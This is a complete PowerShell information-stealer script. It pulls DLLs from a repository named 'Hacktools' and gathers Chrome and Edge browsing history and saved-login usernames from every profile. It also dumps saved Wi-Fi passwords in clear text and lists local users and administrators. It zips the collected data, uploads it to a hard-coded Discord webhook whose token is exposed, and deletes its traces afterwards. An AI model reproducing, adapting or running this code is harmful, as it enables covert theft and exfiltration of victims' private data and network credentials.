# Hard-coded webhook URL
$WebhookUrl = 'https://discord.com/api/webhooks/1376154720556552241/x0lZnMTufsMD51RtzhMNFXsUtlZZ2qugkrT_yN8KFt1pq7XPBqC_l6bIBXbPuqGBd1k8'
if ([string]::IsNullOrEmpty($WebhookUrl)) {
    Write-Error "No webhook URL provided. Exiting script."
    exit 1
}

$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
if ($IsAdmin) {
    Write-Verbose "Running as Administrator."
} else {
    Write-Verbose "Running as normal user."
}


# Paths & URLs
$sqliteManagedPath = "$env:TEMP\System.Data.SQLite.dll"
$sqliteInteropPath = "$env:TEMP\SQLite.Interop.dll"
$managedUrl        = 'https://github.com/BlueJuice1/Hacktools/releases/download/V1/System.Data.SQLite.dll'
$interopUrl        = 'https://github.com/BlueJuice1/Hacktools/releases/download/V1.0/SQLite.Interop.dll'

# Prepare temp directory
$tempDir = Join-Path $env:TEMP 'CollectedData'
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempDir | Out-Null

# Download managed DLL if missing
if (-not (Test-Path $sqliteManagedPath)) {
    try {
        Write-Verbose "Downloading managed SQLite DLL..."
        Invoke-WebRequest -Uri $managedUrl -OutFile $sqliteManagedPath -Headers @{ 'User-Agent' = 'Mozilla/5.0' } -ErrorAction Stop
    } catch {
        Write-Warning "Failed to download managed DLL: $($_.Exception.Message)"
    }
}

# Download interop DLL if missing
if (-not (Test-Path $sqliteInteropPath)) {
    try {
        Write-Verbose "Downloading interop SQLite DLL..."
        Invoke-WebRequest -Uri $interopUrl -OutFile $sqliteInteropPath -Headers @{ 'User-Agent' = 'Mozilla/5.0' } -ErrorAction Stop
    } catch {
        Write-Warning "Failed to download interop DLL: $($_.Exception.Message)"
    }
}


# Load SQLite managed assembly if available
if (Test-Path $sqliteManagedPath) {
    try {
        Add-Type -Path $sqliteManagedPath -ErrorAction Stop
    } catch {
        Write-Warning "Could not load System.Data.SQLite.dll: $($_.Exception.Message)"
    }
} else {
    Write-Warning "System.Data.SQLite.dll not found at $sqliteManagedPath. SQLite functionality will be skipped."
}

function Extract-BrowserAccounts {
    param(
        [Parameter(Mandatory = $true)][string]$browserName,
        [Parameter(Mandatory = $true)][string]$userDataPath
    )

    Write-Host "Extract-BrowserAccounts called for browser: $browserName"
    Write-Host "userDataPath parameter value: '$userDataPath'"

    $outputFile = Join-Path $tempDir "${browserName}_Accounts.txt"

    $loginDataPath = Join-Path $userDataPath 'Login Data'
    if (-not (Test-Path $loginDataPath)) {
        Add-Content -Path $outputFile "'Login Data' not found. Skipping."
        return
    }

    $tmp = Join-Path $env:TEMP "${browserName}-LoginData.db"
    Copy-Item -LiteralPath $loginDataPath -Destination $tmp -Force -ErrorAction SilentlyContinue

    $conn = [System.Data.SQLite.SQLiteConnection]::new("Data Source=$tmp;Version=3;Read Only=True;")
    try {
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = 'SELECT origin_url, username_value FROM logins'
        $reader = $cmd.ExecuteReader()

        Add-Content -Path $outputFile "===== Saved Logins (Usernames only) for $browserName ====="
        while ($reader.Read()) {
            $entry = @"
URL:      $($reader['origin_url'])
Username: $($reader['username_value'])
-------------------------
"@
            Add-Content -Path $outputFile $entry
        }
        $reader.Close()
    }
    finally {
        $cmd.Dispose()
        $conn.Close()
        $conn.Dispose()
        if (Test-Path $tmp) { Remove-Item -Path $tmp -Force -ErrorAction SilentlyContinue }
    }
}

function Get-BrowserProfiles {
    param([string]$userDataPath)

    $profiles = @()
    if (Test-Path $userDataPath) {
        # Profiles are folders named Default, Profile 1, Profile 2, etc.
        $dirs = Get-ChildItem -Directory -Path $userDataPath | Where-Object {
            $_.Name -match '^Default$|^Profile \d+$'
        }
        foreach ($dir in $dirs) {
            $profiles += $dir.FullName
        }
    }
    return $profiles
}
function Extract-BrowserHistory {
    param(
        [Parameter(Mandatory = $true)][string]$browserName,
        [Parameter(Mandatory = $true)][string]$userDataPath
    )

    $outputFile = Join-Path $tempDir "${browserName}_History.txt"
    $historyDb  = Join-Path $userDataPath "History"

    if (-not (Test-Path -LiteralPath $historyDb)) {
        Add-Content -Path $outputFile "History database not found."
        return
    }

    $tempDbPath = Join-Path $env:TEMP "$browserName-History.db"

    # Retry copy in case of locking issues
    $copySuccess = $false
    for ($i = 0; $i -lt 3; $i++) {
        try {
            Copy-Item -LiteralPath $historyDb -Destination $tempDbPath -Force -ErrorAction Stop
            $copySuccess = $true
            break
        } catch {
            Start-Sleep -Milliseconds 200
        }
    }

    if (-not $copySuccess) {
        Add-Content -Path $outputFile "Failed to copy History database after multiple attempts."
        return
    }

    $conn = [System.Data.SQLite.SQLiteConnection]::new("Data Source=$tempDbPath;Version=3;Read Only=True;")
    try {
        $conn.Open()
        $cmd = $conn.CreateCommand()

        try {
            $cmd.CommandText = @"
SELECT url, title, visit_count, last_visit_time
  FROM urls
 ORDER BY last_visit_time DESC
 LIMIT 10000
"@

            $reader = $cmd.ExecuteReader()
            Add-Content -Path $outputFile "===== Browsing History ($browserName) ====="

            $epoch = [DateTime]::ParseExact('16010101', 'yyyyMMdd', $null, [System.Globalization.DateTimeStyles]::AssumeUniversal)

            try {
                while ($reader.Read()) {
                    $lastVisitRaw = $reader["last_visit_time"]
                    $lastVisit = $epoch.AddTicks([int64]$lastVisitRaw * 10).ToLocalTime()
                    $line = "{0} - {1} - {2} (Visits: {3})" -f $lastVisit, $reader['title'], $reader['url'], $reader['visit_count']
                    Add-Content -Path $outputFile $line
                }
            }
            finally {
                if ($reader) { $reader.Close(); $reader.Dispose() }
            }
        }
        finally {
            if ($cmd) { $cmd.Dispose() }
        }
    }
    catch {
        Add-Content -Path $outputFile "Error reading History DB: $($_.Exception.Message)"
    }
    finally {
        if ($conn.State -eq 'Open') { $conn.Close() }
        $conn.Dispose()

        Start-Sleep -Milliseconds 100

        for ($retry = 0; $retry -lt 5; $retry++) {
            try {
                if (Test-Path -LiteralPath $tempDbPath) { Remove-Item -LiteralPath $tempDbPath -Force -ErrorAction Stop }
                break
            }
            catch {
                Start-Sleep -Milliseconds 200
            }
        }
    }
}

function Extract-WiFiPasswords {
    Write-Host "Extracting WiFi passwords..."
    $outputFile = Join-Path $tempDir "WiFiPasswords.txt"
    Add-Content $outputFile "===== Saved Wi-Fi Profiles and Passwords =====" -Encoding UTF8

    $profiles = netsh wlan show profiles | Select-String ':\s(.*)$' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
    foreach ($profile in $profiles) {
        if (-not [string]::IsNullOrEmpty($profile)) {
            $profileInfo = netsh wlan show profile name="$profile" key=clear
            $keyLine = $profileInfo | Select-String "Key Content\s*:\s*(.*)"
            $key = if ($keyLine) { $keyLine.Matches[0].Groups[1].Value } else { "[No Password]" }
            Add-Content $outputFile "Profile: $profile" -Encoding UTF8
            Add-Content $outputFile "Password: $key" -Encoding UTF8
            Add-Content $outputFile "-------------------------" -Encoding UTF8
        }
    }
}

function Extract-LocalUserInfo {
    param (
        [string]$OutputDir = $tempDir
    )
    $outputFile = Join-Path $OutputDir "LocalUsers.txt"
    Add-Content $outputFile "===== Local Users and Admins =====" -Encoding UTF8

    $users = Get-LocalUser
    foreach ($u in $users) {
        Add-Content $outputFile "User: $($u.Name)" -Encoding UTF8
        Add-Content $outputFile "Enabled: $($u.Enabled)" -Encoding UTF8
        Add-Content $outputFile "FullName: $($u.FullName)" -Encoding UTF8
        Add-Content $outputFile "Description: $($u.Description)" -Encoding UTF8
        Add-Content $outputFile "-------------------------" -Encoding UTF8
    }

    Add-Content $outputFile "" -Encoding UTF8
    Add-Content $outputFile "===== Members of Administrators Group =====" -Encoding UTF8

    $admins = Get-LocalGroupMember -Group "Administrators"
    foreach ($a in $admins) {
        Add-Content $outputFile $a.Name -Encoding UTF8
    }
}


### Main Execution ###

# Define browser user data paths
$localAppData = $env:LOCALAPPDATA

# Base User Data folders
$chromeUserDataPath = Join-Path $localAppData 'Google\Chrome\User Data'
$edgeUserDataPath   = Join-Path $localAppData 'Microsoft\Edge\User Data'

# --- Extract Browser History for Chrome (all profiles) ---
$chromeProfiles = Get-BrowserProfiles -userDataPath $chromeUserDataPath
foreach ($profile in $chromeProfiles) {
    Extract-BrowserHistory -browserName "Chrome-$((Split-Path $profile -Leaf))" -userDataPath $profile
}
Write-Host "Extracted Chrome browser history"

# --- Extract Browser History for Edge (all profiles) ---
$edgeProfiles = Get-BrowserProfiles -userDataPath $edgeUserDataPath
foreach ($profile in $edgeProfiles) {
    Extract-BrowserHistory -browserName "Edge-$((Split-Path $profile -Leaf))" -userDataPath $profile
}
Write-Host "Extracted Edge browser history"

# --- Extract Accounts from Default profiles only (where passwords are usually stored) ---
$chromeProfilePath = Join-Path $chromeUserDataPath 'Default'
$edgeProfilePath   = Join-Path $edgeUserDataPath 'Default'

Extract-BrowserAccounts -browserName 'Chrome' -userDataPath $chromeProfilePath
Write-Host "Extracted Chrome browser accounts"

Extract-BrowserAccounts -browserName 'Edge' -userDataPath $edgeProfilePath
Write-Host "Extracted Edge browser accounts"

# Wi-Fi and Local Info
Extract-WiFiPasswords
Write-Host "Extracted Wi-Fi passwords"
Extract-LocalUserInfo
Write-Host "Extracted local user info"

# Confirm files before zipping
Write-Host "Files in $tempDir before zipping:"
Get-ChildItem -Path $tempDir | ForEach-Object { Write-Host $_.FullName }

# Zip data
$zipPath = Join-Path $env:TEMP "CollectedData.zip"
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

try {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
} catch {
    Write-Warning "Failed to compress archive: $_"
    return
}

function Upload-DiscordWebhook {
    param (
        [string]$WebhookUrl,
        [string]$ZipFilePath
    )

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $filename = [System.IO.Path]::GetFileName($ZipFilePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($ZipFilePath)

    $header = "--$boundary$LF"
    $header += "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"$LF"
    $header += "Content-Type: application/zip$LF$LF"

    $footer = "$LF--$boundary--$LF"

    $headerBytes = [System.Text.Encoding]::ASCII.GetBytes($header)
    $footerBytes = [System.Text.Encoding]::ASCII.GetBytes($footer)

    $bodyBytes = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
    [Array]::Copy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
    [Array]::Copy($fileBytes, 0, $bodyBytes, $headerBytes.Length, $fileBytes.Length)
    [Array]::Copy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $fileBytes.Length, $footerBytes.Length)

    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }

    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $bodyBytes
        Write-Host "Upload successful."
    }
    catch {
        Write-Warning "Upload failed: $_"
    }
}

Upload-DiscordWebhook -WebhookUrl $WebhookUrl -ZipFilePath $zipPath

# Clean up
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
